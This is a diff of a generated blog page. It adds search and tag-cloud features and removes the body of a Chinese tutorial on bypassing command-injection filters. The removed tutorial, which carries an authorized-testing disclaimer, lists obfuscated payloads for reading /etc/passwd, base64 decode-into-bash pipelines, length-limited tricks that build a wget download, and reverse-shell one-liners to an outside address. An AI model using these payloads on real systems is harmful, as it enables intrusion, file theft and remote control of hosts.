@@ -17,7 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
 <meta property="og:type" content="website">
@@ -51,7 +51,9 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
 <script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
-  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
 
   <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
   <script src="/js/third-party/tags/mermaid.js" defer></script>
@@ -97,6 +99,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -105,11 +108,37 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
         
@@ -150,8 +179,9 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
+          <a href="/tags/">
         <span class="site-state-item-count">18</span>
-        <span class="site-state-item-name">标签</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -163,6 +193,37 @@
         <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
       </span>
   </div>
+<div class="sidebar-tags">
+  <div class="sidebar-title">标签</div>
+  <div class="tag-cloud">
+    <a href="/tags/Web安全/" style="font-size: 1.4em; color: #e74c3c;">Web安全</a>
+    <a href="/tags/渗透测试/" style="font-size: 1.6em; color: #e74c3c;">渗透测试</a>
+    <a href="/tags/框架安全/" style="font-size: 1.2em;">框架安全</a>
+    <a href="/tags/内网渗透/" style="font-size: 1.1em;">内网渗透</a>
+    <a href="/tags/权限提升/" style="font-size: 1.1em;">权限提升</a>
+    <a href="/tags/云安全/" style="font-size: 1em;">云安全</a>
+    <a href="/tags/工具/" style="font-size: 1em;">工具</a>
+    <a href="/tags/靶场/" style="font-size: 1em;">靶场</a>
+    <a href="/tags/反序列化/" style="font-size: 0.95em;">反序列化</a>
+    <a href="/tags/移动安全/" style="font-size: 0.9em;">移动安全</a>
+    <a href="/tags/代码审计/" style="font-size: 0.9em;">代码审计</a>
+    <a href="/tags/数据库安全/" style="font-size: 0.85em;">数据库安全</a>
+    <a href="/tags/后渗透/" style="font-size: 0.85em;">后渗透</a>
+    <a href="/tags/密码学/" style="font-size: 0.8em;">密码学</a>
+    <a href="/tags/认证安全/" style="font-size: 0.8em;">认证安全</a>
+    <a href="/tags/信息收集/" style="font-size: 0.75em;">信息收集</a>
+    <a href="/tags/方法论/" style="font-size: 0.75em;">方法论</a>
+    <a href="/tags/安全运维/" style="font-size: 0.75em;">安全运维</a>
+  </div>
+</div>
+
+<style>
+.sidebar-tags { margin-top: 20px; padding: 0 15px; }
+.sidebar-tags .sidebar-title { font-size: 1.1em; font-weight: bold; margin-bottom: 10px; color: #555; }
+.sidebar-tags .tag-cloud { line-height: 2; }
+.sidebar-tags .tag-cloud a { display: inline-block; margin: 0 8px 4px 0; padding: 2px 8px; border-radius: 3px; background: #f5f5f5; text-decoration: none; border-bottom: none; }
+.sidebar-tags .tag-cloud a:hover { background: #e74c3c; color: #fff !important; }
+</style>
 
         </div>
       </div>
@@ -220,7 +281,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -312,7 +373,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -404,7 +465,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:14" itemprop="dateModified" datetime="2026-06-05T13:34:14+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -496,7 +557,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:35" itemprop="dateModified" datetime="2026-06-05T00:12:35+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -588,7 +649,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -610,419 +671,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>命令注入（Command Injection）是 Web 安全领域最经典的漏洞类型之一，其危害等级常年位居 OWASP Top 10 前列。随着 WAF（Web Application Firewall）与各类输入过滤规则的普及，简单的 <code>;cat /etc/passwd</code> 早已成为历史。本文系统梳理了实战中行之有效的命令注入绕过技巧，涵盖关键字黑名单绕过、长度受限注入、无字母数字 Shell 等核心方法论，并附有完整的绕过技巧参考表。</p>
-<blockquote>
-<p><strong>免责声明</strong>：本文所述技术仅用于授权的安全测试与教育目的。未经授权对目标系统进行渗透测试属于违法行为。作者不对读者滥用本文内容导致的后果承担任何法律责任。</p>
-</blockquote>
-<hr>
-<h2 id="一、命令注入基础"><a href="#一、命令注入基础" class="headerlink" title="一、命令注入基础"></a>一、命令注入基础</h2><h3 id="1-1-常见命令注入点"><a href="#1-1-常见命令注入点" class="headerlink" title="1.1 常见命令注入点"></a>1.1 常见命令注入点</h3><p>命令注入常出现在以下场景：</p>
-<ul>
-<li>Web 应用直接调用系统命令（如 <code>system()</code>、<code>exec()</code>、<code>popen()</code>）</li>
-<li><code>ping</code>、<code>traceroute</code>、<code>nslookup</code> 等网络诊断功能</li>
-<li>文件上传处理中的 <code>ffmpeg</code>、<code>imagemagick</code> 调用</li>
-<li>邮件发送功能中的 <code>sendmail</code> 调用</li>
-<li>备份&#x2F;导出功能中的 <code>tar</code>、<code>zip</code> 调用</li>
-</ul>
-<p>description: 命令注入绕过——空格&#x2F;关键字&#x2F;长度限制绕过与无字母数字 Shell 技巧。</p>
-<h3 id="1-2-命令注入连接符总览"><a href="#1-2-命令注入连接符总览" class="headerlink" title="1.2 命令注入连接符总览"></a>1.2 命令注入连接符总览</h3><table>
-<thead>
-<tr>
-<th>连接符</th>
-<th>格式</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>;</code></td>
-<td><code>cmd1 ; cmd2</code></td>
-<td>顺序执行，无论前者成功与否</td>
-</tr>
-<tr>
-<td><code>|</code></td>
-<td><code>cmd1 | cmd2</code></td>
-<td>管道，将前者输出作为后者输入</td>
-</tr>
-<tr>
-<td><code>||</code></td>
-<td><code>cmd1 || cmd2</code></td>
-<td>前者失败时执行后者</td>
-</tr>
-<tr>
-<td><code>&amp;&amp;</code></td>
-<td><code>cmd1 &amp;&amp; cmd2</code></td>
-<td>前者成功后执行后者</td>
-</tr>
-<tr>
-<td><code>&amp;</code></td>
-<td><code>cmd1 &amp; cmd2</code></td>
-<td>前者后台运行，同时执行后者</td>
-</tr>
-<tr>
-<td><code>\n</code></td>
-<td><code>cmd1 \n cmd2</code></td>
-<td>换行符分隔（URL 编码 <code>%0a</code>）</td>
-</tr>
-<tr>
-<td><code>%0d%0a</code></td>
-<td>CRLF</td>
-<td>回车换行符组合</td>
-</tr>
-<tr>
-<td><code>`</code></td>
-<td><code>`cmd`</code></td>
-<td>反引号命令替换</td>
-</tr>
-<tr>
-<td><code>$()</code></td>
-<td><code>$(cmd)</code></td>
-<td>命令替换（现代 shell）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="二、关键字黑名单绕过"><a href="#二、关键字黑名单绕过" class="headerlink" title="二、关键字黑名单绕过"></a>二、关键字黑名单绕过</h2><h3 id="2-1-反斜杠绕过"><a href="#2-1-反斜杠绕过" class="headerlink" title="2.1 反斜杠绕过"></a>2.1 反斜杠绕过</h3><p>利用反斜杠使关键字在词法层面断裂，但 shell 解析时仍能正常执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过 cat 关键字</span></span><br><span class="line">/bin/c\at /etc/passwd</span><br><span class="line">c\a\t /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过常见命令</span></span><br><span class="line">w\h\o\a\m\i</span><br><span class="line">i\d</span><br><span class="line">l\s -la</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-单引号绕过"><a href="#2-2-单引号绕过" class="headerlink" title="2.2 单引号绕过"></a>2.2 单引号绕过</h3><p>单引号内部的内容在 shell 中被视为字面量，但拼接后仍能作为命令执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过 cat 关键字</span></span><br><span class="line">/bin/c<span class="string">&#x27;a&#x27;</span>t /etc/passwd</span><br><span class="line">c<span class="string">&#x27;a&#x27;</span>t /etc/passwd</span><br><span class="line">/usr/bin/c<span class="string">&#x27;a&#x27;</span>t /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过空格</span></span><br><span class="line"><span class="built_in">cat</span><span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line"><span class="built_in">cat</span>&lt;/etc/passwd</span><br><span class="line">c<span class="string">&#x27;a&#x27;</span>t&lt;/etc<span class="string">&#x27;/pas&#x27;</span>swd<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3-双引号绕过"><a href="#2-3-双引号绕过" class="headerlink" title="2.3 双引号绕过"></a>2.3 双引号绕过</h3><p>双引号功能类似单引号，但会解析部分特殊字符（如 <code>$</code>、<code>`</code>）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕过 cat 关键字</span></span><br><span class="line">/bin/c<span class="string">&quot;a&quot;</span>t /etc/passwd</span><br><span class="line">c<span class="string">&quot;a&quot;</span>t /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号与变量展开结合</span></span><br><span class="line">c<span class="string">&quot;a&quot;</span>t /etc/pass<span class="string">&quot;w&quot;</span>d</span><br><span class="line">/bin/<span class="string">&quot;who&quot;</span>ami</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-4-变量拼接绕过"><a href="#2-4-变量拼接绕过" class="headerlink" title="2.4 变量拼接绕过"></a>2.4 变量拼接绕过</h3><p>通过定义空变量或拼接环境变量来拆分关键字：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 空变量拼接</span></span><br><span class="line">ca<span class="variable">$u</span> /etc/passwd          <span class="comment"># $u 为空</span></span><br><span class="line">/bin/ca<span class="variable">$&#123;u&#125;</span>t /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用已有环境变量</span></span><br><span class="line"><span class="variable">$IFS</span>                          <span class="comment"># 内部字段分隔符，默认为空格/制表符/换行</span></span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/etc/passwd</span><br><span class="line">ca<span class="variable">$&#123;PATH%%u*&#125;</span>t               <span class="comment"># 截取环境变量路径片段</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见环境变量利用</span></span><br><span class="line"><span class="variable">$&#123;HOME:0:1&#125;</span>                   <span class="comment"># 获取 &quot;/&quot;</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$&#123;HOME:0:1&#125;</span>etc<span class="variable">$&#123;HOME:0:1&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-5-Base64-编码绕过"><a href="#2-5-Base64-编码绕过" class="headerlink" title="2.5 Base64 编码绕过"></a>2.5 Base64 编码绕过</h3><p>将恶意命令进行 Base64 编码后解码执行，完全规避关键字检测：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编码命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cat /etc/passwd&quot;</span> | <span class="built_in">base64</span></span><br><span class="line"><span class="comment"># 输出: Y2F0IC9ldGMvcGFzc3dkCg==</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码并执行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9ldGMvcGFzc3dkCg==&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9ldGMvcGFzc3dkCg==&quot;</span> | <span class="built_in">base64</span> -d`</span><br><span class="line">$(<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9ldGMvcGFzc3dkCg==&quot;</span> | <span class="built_in">base64</span> -d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一行命令执行</span></span><br><span class="line"><span class="built_in">echo</span> Y2F0IC9ldGMvcGFzc3dkCg== | <span class="built_in">base64</span> -d | sh</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-6-Hex-Octal-编码绕过"><a href="#2-6-Hex-Octal-编码绕过" class="headerlink" title="2.6 Hex &#x2F; Octal 编码绕过"></a>2.6 Hex &#x2F; Octal 编码绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ASCII 十六进制</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\x2f\x62\x69\x6e\x2f\x63\x61\x74&quot;</span>  <span class="comment"># 输出 /bin/cat</span></span><br><span class="line">$<span class="string">&#x27;\x62\x69\x6e&#x27;</span>                               <span class="comment"># bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 八进制（echo 不支持，需 printf）</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\57\142\151\156\57\143\141\164&#x27;</span>      <span class="comment"># 输出 /bin/cat</span></span><br><span class="line">$<span class="string">&#x27;\57\142\151\156&#x27;</span>                            <span class="comment"># bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合使用</span></span><br><span class="line">$<span class="string">&#x27;\x2f\x62\x69\x6e&#x27;</span>$<span class="string">&#x27;\x2f&#x27;</span>$<span class="string">&#x27;\x63\x61\x74&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-7-通配符绕过"><a href="#2-7-通配符绕过" class="headerlink" title="2.7 通配符绕过"></a>2.7 通配符绕过</h3><p>利用 shell 通配符（globbing）匹配目标命令或文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 问号通配（匹配单个字符）</span></span><br><span class="line">/???/c?t /???/p?ss??</span><br><span class="line">/bin/ca? /etc/pass??</span><br><span class="line"></span><br><span class="line"><span class="comment"># 星号通配（匹配任意字符）</span></span><br><span class="line">/**/c?t /etc/p****d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符范围匹配</span></span><br><span class="line">/bin/[a-z][a-z][a-z] /etc/passwd</span><br><span class="line">/usr/bin/c[a]t /etc/p[a]sswd</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-8-大小写变形绕过"><a href="#2-8-大小写变形绕过" class="headerlink" title="2.8 大小写变形绕过"></a>2.8 大小写变形绕过</h3><p>部分 WAF 采用大小写敏感的规则匹配（Windows 环境下尤其有效）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows 系统（CMD 大小写不敏感）</span></span><br><span class="line">cAt /etc/passwd</span><br><span class="line">WhOaMi</span><br><span class="line">NeT uSeR</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux 系统（需配合命令路径的大小写变体）</span></span><br><span class="line"><span class="comment"># 利用 $&#123;&#125; 大小写转换（bash 4.0+）</span></span><br><span class="line"><span class="variable">$&#123;COMMAND,,&#125;</span>  <span class="comment"># 转小写</span></span><br><span class="line"><span class="variable">$&#123;command^^&#125;</span>  <span class="comment"># 转大写</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="三、长度受限注入"><a href="#三、长度受限注入" class="headerlink" title="三、长度受限注入"></a>三、长度受限注入</h2><h3 id="3-1-极短-Payload-构造"><a href="#3-1-极短-Payload-构造" class="headerlink" title="3.1 极短 Payload 构造"></a>3.1 极短 Payload 构造</h3><p>当注入点只允许极短字符串输入时（例如 10 字符以内），可采取以下策略：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件重定向写马（逐字符追加）</span></span><br><span class="line">&gt;a</span><br><span class="line">&gt;\</span><br><span class="line">&gt;_                 <span class="comment"># 依次创建文件名，最后拼成命令</span></span><br><span class="line"><span class="built_in">ls</span> -t &gt; a          <span class="comment"># 按时间排序写入文件</span></span><br><span class="line">sh a               <span class="comment"># 执行拼接出的命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每步仅需 3 字符左右</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-2-最短命令技巧"><a href="#3-2-最短命令技巧" class="headerlink" title="3.2 最短命令技巧"></a>3.2 最短命令技巧</h3><table>
-<thead>
-<tr>
-<th>目标</th>
-<th>最短 Payload</th>
-<th>字符数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>列出目录</td>
-<td><code>ls</code></td>
-<td>2</td>
-</tr>
-<tr>
-<td>查看文件</td>
-<td><code>cat *</code></td>
-<td>5</td>
-</tr>
-<tr>
-<td>查看文件（无空格）</td>
-<td><code>cat&lt;f</code></td>
-<td>5</td>
-</tr>
-<tr>
-<td>下载文件</td>
-<td><code>wget 1.1.1.1</code></td>
-<td>12</td>
-</tr>
-<tr>
-<td>反弹 Shell（bash）</td>
-<td><code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/8080 0&gt;&amp;1</code></td>
-<td>38+</td>
-</tr>
-<tr>
-<td>最短反弹 Shell</td>
-<td><code>sh -i&gt;&amp;/dev/tcp/1.1.1.1/8080 0&gt;&amp;1</code></td>
-<td>36</td>
-</tr>
-</tbody></table>
-<h3 id="3-3-多步构造法"><a href="#3-3-多步构造法" class="headerlink" title="3.3 多步构造法"></a>3.3 多步构造法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第 1 步：写入 wget 命令到文件</span></span><br><span class="line">&gt; w</span><br><span class="line">&gt; g</span><br><span class="line">&gt; e</span><br><span class="line">&gt; t</span><br><span class="line"><span class="built_in">ls</span> -t&gt;x              <span class="comment"># 按创建时间倒序拼出 &quot;wget&quot;</span></span><br><span class="line"><span class="comment"># 第 2 步：用该文件下载完整 payload</span></span><br><span class="line">sh x 1.1.1.1/a.txt</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="四、无字母数字-Shell"><a href="#四、无字母数字-Shell" class="headerlink" title="四、无字母数字 Shell"></a>四、无字母数字 Shell</h2><h3 id="4-1-取反位运算"><a href="#4-1-取反位运算" class="headerlink" title="4.1 取反位运算"></a>4.1 取反位运算</h3><p>在 PHP 中常见，利用取反操作符生成任意字符，但 Bash 的思路不同——主要靠通配符与环境变量：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 $&#x27;\ooo&#x27; 八进制构造</span></span><br><span class="line">$<span class="string">&#x27;\154\163&#x27;</span>          <span class="comment"># 等价于 ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完全没有字母时，利用通配符匹配 /bin 下的命令</span></span><br><span class="line">/???/??              <span class="comment"># 可能匹配 /bin/ls 等</span></span><br><span class="line">/???/???             <span class="comment"># 可能匹配 /bin/cat 等</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="4-2-利用特殊变量生成字符"><a href="#4-2-利用特殊变量生成字符" class="headerlink" title="4.2 利用特殊变量生成字符"></a>4.2 利用特殊变量生成字符</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># $&#123;#&#125; 始终为 0</span></span><br><span class="line"><span class="comment"># $&#123;##&#125; 为 1</span></span><br><span class="line"><span class="comment"># 通过移位和运算逐步构造数字，再映射为 ASCII</span></span><br><span class="line">__=$<span class="string">&#x27;\x2f&#x27;</span>             <span class="comment"># /</span></span><br><span class="line">__=$__$<span class="string">&#x27;\x62&#x27;</span>          <span class="comment"># /b</span></span><br><span class="line">__=$__$<span class="string">&#x27;\x69&#x27;</span>          <span class="comment"># /bi</span></span><br><span class="line">__=$__$<span class="string">&#x27;\x6e&#x27;</span>          <span class="comment"># /bin</span></span><br><span class="line">__=$__$<span class="string">&#x27;\x2f&#x27;</span>$<span class="string">&#x27;\x63&#x27;</span>$<span class="string">&#x27;\x61&#x27;</span>$<span class="string">&#x27;\x74&#x27;</span>  <span class="comment"># /bin/cat</span></span><br><span class="line"><span class="variable">$__</span> /etc/passwd</span><br></pre></td></tr></table></figure>
-
